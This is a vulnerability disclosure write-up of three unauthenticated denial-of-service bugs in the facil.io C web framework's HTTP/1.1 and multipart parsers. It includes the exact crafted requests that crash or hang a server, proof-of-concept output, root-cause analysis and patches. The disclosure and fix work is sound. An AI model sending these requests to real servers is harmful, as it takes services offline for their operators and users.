---
title: "When Zero Minus One Is Four Billion: Three Unauthenticated DoS Bugs in facil.io"
date: 2026-07-30
draft: false
featured: false
notoc: true
summary: "Three unauthenticated denial-of-service bugs in facil.io's hand-written HTTP and multipart parsers, all the same shape: a value that is correct where it is computed and wrong by the time someone uses it."
cve: ["CVE-2026-66729", "CVE-2026-66730", "CVE-2026-66731"]
tags: [c, dos, http-parser, integer-overflow, facil-io]
poc_url: ""
poc_sha256: ""
poc_notes: ""
---

[facil.io](https://github.com/boazsegev/facil.io) is a C web framework with hand written parsers for HTTP/1.1, multipart forms, WebSocket, JSON, and Mustache. All of them sit directly on the socket, so a parser bug is reachable with one unauthenticated request.

I found three. Two crash the process, the third spins it at 100% CPU forever, which is worse because a crashed worker gets respawned, a spinning one does not.

Everything below was verified against git HEAD `51287473` (facil.io 0.7.x) on macOS ARM64.

| CVE | Bug | Component | Effect | CVSS 4.0 | Affected |
|---|---|---|---|---|---|
| 66729 | `uint32_t` underflow on empty field name | multipart parser | OOB read, crash | 8.7 High | 0.6.0 to 0.7.6 |
| 66731 | negative chunk size inverts a state flag | HTTP/1.1 parser | pointer 16 MB out of bounds, crash | 8.7 High | 0.7.5 to 0.7.6 |
| 66730 | parser returns 0 consumed, caller loops | multipart parser | worker pinned at 100% CPU | 8.7 High | 0.6.0 to 0.7.6 |

66731 is the one to care about most if you run facil.io: it needs no cooperation from application code.

## The harness

A minimal server that reaches as many parsers as possible:

```c
static void on_request(http_s *h) {
  http_parse_body(h);            /* dispatches to MIME/JSON by Content-Type */
  http_send_body(h, "OK", 2);
}
```

That `http_parse_body(h)` call matters for two of the three bugs. An application that never calls it never reaches the multipart parser. It is also what every facil.io form-handling example calls, so it is not an exotic configuration.

Built with clang, ASAN and UBSAN:

```bash
clang -O0 -g -fsanitize=address,undefined -fno-omit-frame-pointer \
  -fno-sanitize-recover=all -DDEBUG \
  ../pocs/poc_server.c "${LIB_SRCS[@]}" -lpthread -o ../pocs/poc_server
```

One worker, one thread (`fio_start(.threads = 1, .workers = 1)`), so nothing respawns back and hides a crash.

I fuzzed it first with mutated HTTP requests and got nothing. Naive mutation mostly produces requests that die in the first fifty lines of the parser. All three bugs below need a request that is structurally valid and semantically nonsense, which is a narrow target to hit by chance. So I read the code instead, looking for integer arithmetic near pointer arithmetic.

## Bug one: a length that counts backwards

The multipart parser extracts the field name from each part's `Content-Disposition` header:

```c
// lib/facil/http/parsers/http_mime_parser.h:233-242
start = memchr(name, ';', (size_t)(end - start));
if (!start) {
  name_len = (size_t)(end - name);
  if (name[name_len - 1] == '\r')
    --name_len;
} else {
  name_len = (size_t)(start - name);
}
if (name[name_len - 1] == '"')
  --name_len;
```

The last two lines trim a trailing double quote, since the name may be quoted. Reasonable. But `name_len` is declared `uint32_t` (line 189), and there is no zero check.

If the header says `name=;`, `memchr` finds the semicolon at the position where the name starts, so `start - name` is 0. Then:

```
name[name_len - 1]  ->  name[(uint32_t)0 - 1]  ->  name[0xFFFFFFFF]
```

The subtraction happens in unsigned 32-bit arithmetic and wraps. The parser reads 4,294,967,295 bytes past `name`.

The `(size_t)` casts on lines 235 and 239 look like someone thought about types, but they are applied to the right hand side of an assignment into a `uint32_t`, so the value truncates straight back down and line 241 is still 32-bit.

Trigger, which is a normal multipart POST with `name=;` instead of `name="x";`:

```
--B
Content-Disposition: form-data; name=;

value
--B--
```

```
$ python3 poc1_mime_oob_read.py 127.0.0.1 3000
[*] Sending 183-byte request to 127.0.0.1:3000
[*] Payload: Content-Disposition: form-data; name=;
[!] Got response (not crashed): b''

$ pgrep -fl poc_server; echo "exit=$?"
exit=1
```

The script prints "not crashed" because it got an empty read rather than a reset, which is a detection logic error in my script. `pgrep` exiting 1 with no output is the real evidence.

```
==38402==ERROR: AddressSanitizer: SEGV on unknown address 0x0004007f3269
==38402==The signal is caused by a READ memory access.
    #0 0x000100665df0 in http_mime_parse http_mime_parser.h:241
    #1 0x000100662dec in http_parse_body http.c:1964
    #2 0x0001002cd3c4 in on_request poc_server.c:30
    #3 0x000100612aec in http_on_request_handler______internal http_internal.c:53
    #4 0x000100634f68 in http1_on_request http1.c:553
    #5 0x000100631ccc in http1_parse http1_parser.h:859
    ...
==38402==Register values:
 x[10] = 0x00000000ffffffff  x[11] = 0x00000003007f326a
SUMMARY: AddressSanitizer: SEGV http_mime_parser.h:241 in http_mime_parse
```

`x[11]` is the `name` pointer, `x[10]` is the index `0xffffffff`. They sum to `0x4007f3269`, the faulting address ASAN reports.

This is an out of bounds read, so the obvious follow-up question is whether it leaks anything. It does not, as far as I can tell: the offset is fixed at exactly 4 GB with no way to steer it, and the read faults before the byte reaches any code that could act on it.

Fix:

```c
if (name_len > 0 && name[name_len - 1] == '"')
  --name_len;
```

Assigned **CVE-2026-66729** ([advisory](https://github.com/theopaid/CVE-2026-66729-Out-of-Bounds-Read-in-facil.io-MIME-Parser-leads-to-Server-Crash)).

## Bug two: negative hexadecimal

Chunked encoding prefixes each chunk with its size in hex. facil.io parses that with `http1_atol16`, which accepts a sign:

```c
// lib/facil/http/parsers/http1_parser.h:316-346
for (int limit_ = 0; (*buf == '-' || *buf == '+') && limit_ < 32; ++limit_)
  inv ^= (*(buf++) == '-');
/* ... hex digit accumulation ... */
if (inv)
  i = 0ULL - i;
return i;
```

Accepting a sign is reasonable for a generic string-to-number helper. But RFC 7230 defines a chunk size as a non-negative hex integer, and this function only ever parses chunk sizes and content lengths, so there is no valid input where the minus should be accepted.

Accepting it is not itself a memory safety problem. The problem is that the caller encodes parser state in the *sign* of one field. Positive `content_length` means "reading a plain body of this many bytes," negative means "inside a chunk, this many to go." So it stores the negation:

```c
// lib/facil/http/parsers/http1_parser.h:681-688
long long chunk_len = http1_atol16(end, (const uint8_t **)&end);
/* ... EOL validation ... */
parser->state.content_length = 0 - chunk_len;
```

For a valid chunk size of `10` (hex, so 16 bytes), `content_length` becomes `-16`. Correct. For `-FFFFFF`, `chunk_len` is `-16777215`, so `0 - chunk_len` is **positive** `16777215`. The sign flag is inverted, and the parser now believes it is reading a plain 16 MB body while still inside the chunked handler.

Forty lines later it computes where the chunk ends:

```c
// lib/facil/http/parsers/http1_parser.h:726
end = *start + (0 - parser->state.content_length);
if (end > stop)
  end = stop;
if (end > *start && http1_on_body_chunk(parser, (char *)(*start), end - *start))
  return -1;
parser->state.read += (end - *start);
parser->state.content_length += (end - *start);
*start = end;
```

`0 - 16777215` is negative, so `end` lands 16 MB *before* the buffer, and all three guards decline to help:

- `end > stop` is false, because `end` is below the buffer rather than above it.
- `end > *start` is false, so no callback fires and nothing is read from the bad pointer yet.
- `content_length += (end - *start)` adds `-16777215` to `+16777215`, giving 0, which means "expecting a new chunk header."

Then `*start = end` commits the backward pointer. The loop goes around, the parser tries to read a chunk header from memory that was never mapped, and dies on line 674:

```c
if ((end[0] == '\r' && end[1] == '\n')) {
```

Trigger:

```
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
Connection: close

-FFFFFF
data
0

```

```
$ python3 poc2_chunked_negative_size.py 127.0.0.1 3000
[*] Sending 103-byte request to 127.0.0.1:3000
[*] Payload: chunk size = -FFFFFF

$ pgrep -fl poc_server; echo "exit=$?"
exit=1
```

```
==38453==ERROR: AddressSanitizer: BUS on unknown address (pc 0x00010050b6f8)
==38453==The signal is caused by a READ memory access.
    #0 0x00010050b6f8 in http1_consume_body_chunked http1_parser.h:674
    #1 0x000100504870 in http1_consume_body http1_parser.h:749
    #2 0x000100501928 in http1_parse http1_parser.h:846
    #3 0x0001004ff344 in http1_consume_data http1.c:689
    ...
==38453==Register values:
 x[0] = 0xffffffffff000001   ...
 x[8] = 0x00000002ff7f0cf8   x[9] = 0x00000002ff7f0cf8
x[12] = 0x0000000000000001  x[13] = 0x00000003007f0cf7
SUMMARY: AddressSanitizer: BUS http1_parser.h:674 in http1_consume_body_chunked
```

Both halves of the bug are in that dump. `x[0]` is `0xffffffffff000001`, which as a signed 64-bit value is `-16777215`: the negative offset being added to the pointer. And `x[13]` (`0x3007f0cf7`) sits in the region where the request buffer lives, while `x[8]`/`x[9]` hold `0x2ff7f0cf8`. The difference is 16,777,215 exactly, which is `0xFFFFFF`, the chunk size I sent. The read pointer is precisely that far below the buffer.

This one has wider reach than the other two. Bugs one and three need the application to call `http_parse_body()`; this is in the core HTTP/1.1 parser, before any application code runs. Any facil.io 0.7.5 to 0.7.6 server speaking HTTP/1.1 is affected with no configuration required.

I also tried `-0`, hoping for a smuggling primitive: `0 - 0` is `0`, which hits the "all chunks parsed" branch, so the body is complete before any data is read. A front end proxy that parses chunk sizes correctly would disagree with facil.io about where the request ends. Sent side by side against a valid chunk size, the server survives `-0` but answers nothing:

```
chunk size '-0'      -> b'(no response)'
chunk size 'valid 4' -> b'HTTP/1.1 200 OK'
```

Rejecting the sign in `http1_atol16` is the better fix, since it kills the class:

```c
if (*buf == '-' || *buf == '+') { if (end) *end = buf; return -1; }
```

Or validate at the call site:

```c
long long chunk_len = http1_atol16(end, (const uint8_t **)&end);
if (chunk_len < 0) return -1;
```

Worth noting that this area had already been looked at twice. A 2019 commit ("Fix `atol16` to fix chunked length calculation") corrected the overflow detection loop in this same function and left the sign handling in place; a 2020 commit hardened the parser against smuggling via conflicting `Transfer-Encoding` and `Content-Length`. Negative sizes were not on either list, which is easy to miss when the code reads naturally.

Assigned **CVE-2026-66731** ([advisory](https://github.com/theopaid/CVE-2026-66731-Negative-Chunk-Size-Parsing-Causes-Memory-Corruption-leading-to-Server-Crash)).

## Bug three: the one that does not crash

Back in the multipart parser, this is the loop that drives it:

```c
// lib/facil/http/http.c:1963-1967
do {
  size_t cons = http_mime_parse(&p.p, p.buffer.data, p.buffer.len);
  p.pos += cons;
  p.buffer = fiobj_data_pread(h->body, p.pos, 4096);
} while (p.buffer.data && !p.p.done && !p.p.error);
```

It assumes the parser either makes progress or sets a flag. There is no third case. So: can `http_mime_parse` return 0 without setting `done` or `error`? If it can, `p.pos` never moves, `fiobj_data_pread` returns the identical slice, and the loop never exits.

It can. The parser scans for a boundary and has to distinguish "end of form" from "looks like a boundary but I do not have enough bytes to be sure." The second case is this branch:

```c
} else if (end + 4 + parser->boundary_len >= stop) {
  end -= 2;
  if (end[0] == '\r')
    --end;
  pos = end;
  if (end - start)
    http_mime_parser_on_partial_data(parser, start, (size_t)(end - start));
  goto end_of_data;
}
```

The condition means "there are fewer than `4 + boundary_len` bytes left," which is the shortest a complete closing boundary can be (`--`, the boundary, then `--` or CRLF). When that is true the parser cannot tell a real terminator from a truncated one, so it rewinds `pos` to before the CRLF preceding the candidate and leaves those bytes to be re-examined when more data arrives. Correct for a streaming parser.

The trap is that it converges. The first call rewinds `pos` a few bytes and reports that much partial data. On the next call `start` is already at the rewound position, so `end - start` is 0: nothing is reported, `pos` is set to where it started, and the function returns 0 consumed with neither flag set. From the parser's point of view nothing has gone wrong; it is waiting for more data. But the body is already fully buffered, so "wait for more" becomes "wait forever."

Trigger: end the body with a closing boundary that never finishes. A real one is `--B--\r\n`; send `--B-`, dropping the last three bytes, with `Content-Length` set to exactly that truncated length.

```
--B
Content-Disposition: form-data; name=field

value
--B-
```

```
$ python3 poc3_mime_infinite_loop.py 127.0.0.1 3000
[*] Sending 184-byte request to 127.0.0.1:3000
[*] Body ends with: b'\r\n--B-'
[*] Waiting up to 10s for response...
[!!!] Hung for 10s — server spinning at 100% CPU (infinite loop triggered)
```

There is no ASAN report, because nothing is out of bounds. The parser does valid work on valid memory, just the same valid work forever. The evidence is the CPU column:

```
=== baseline CPU (idle server) ===
  PID  %CPU ELAPSED COMMAND
38505   0.0   00:02 ./poc_server -p 3000

=== CPU sample 1 (t+4s) ===
38505  99.0   00:06 ./poc_server -p 3000
=== CPU sample 2 (t+10s) ===
38505  98.5   00:12 ./poc_server -p 3000
=== CPU sample 3 (t+15s) ===
38505 100.0   00:17 ./poc_server -p 3000
```

Idle at 0.0%, then pinned indefinitely. It never returned; `kill -9` was required.

This is the worst of the three despite being the least dramatic. The other two kill a worker and a multi-worker deployment respawns it, so the impact is kind of mitigated automatically in some deployments. Here the worker stays alive and useless. Nothing crashes, so nothing restarts. Send as many requests as the server has workers and it is down until someone restarts it by hand, while every health check still sees a live process listening on the port.

The fix is a progress guard in the caller:

```c
size_t last_pos = (size_t)-1;
do {
  if (p.pos == last_pos) { p.p.error = 1; break; }   /* no progress: abort */
  last_pos = p.pos;
  size_t cons = http_mime_parse(&p.p, p.buffer.data, p.buffer.len);
  p.pos += cons;
  p.buffer = fiobj_data_pread(h->body, p.pos, 4096);
} while (p.buffer.data && !p.p.done && !p.p.error);
```

It belongs in the caller rather than the parser. The parser's behaviour is defensible in isolation; the bug is the assumption in the loop.

Assigned **CVE-2026-66730** ([advisory](https://github.com/theopaid/CVE-2026-66730-Infinite-Loop-DoS-in-facil.io-MIME-Parser)).

## Takeaway

All three bugs are the same shape: a value that is correct where it is computed and wrong by the time someone uses it. A zero length that is fine until you subtract one. A negative number that is fine until you use its sign as a flag.

This code already has a successor. The 0.8.x rewrite in `facil-io/cstl` replaced all of these parsers and none of the three bugs are present there, so the right advice for anyone on 0.7.x is what the project already says: move to cstl.

## References

- [CVE-2026-66729: Out of bounds read in the MIME parser](https://www.cve.org/CVERecord?id=CVE-2026-66729)
- [CVE-2026-66730: Infinite loop DoS in the MIME parser](https://www.cve.org/CVERecord?id=CVE-2026-66730)
- [CVE-2026-66731: Negative chunk size memory corruption](https://www.cve.org/CVERecord?id=CVE-2026-66731)
